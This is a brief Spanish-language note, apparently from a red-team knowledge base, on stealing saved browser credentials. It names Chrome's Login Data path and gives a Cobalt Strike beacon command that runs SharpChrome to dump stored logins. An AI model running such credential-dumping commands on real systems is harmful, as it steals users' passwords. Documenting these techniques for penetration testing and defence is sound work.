---
title: Credentials from Web Browsers
tags: [ad, credential-access, dpapi, sharpdpapi, chrome, beacon]
---

# Credentials from Web Browsers

Los navegadores cifran las credenciales almacenadas usando la **Windows Data Protection API (DPAPI)** y las guardan en una BD SQLite local.

## Ubicaciones por navegador

| Navegador | Path |
|-----------|------|
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |

## Con SharpChrome (Cobalt Strike)

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

## Ver también
- [[04-lateral-movement/credential-access/windows-credential-manager|Windows Credential Manager]]
- [[03-post-explotacion/credential-access/os-credential-dumping|OS Credential Dumping]]
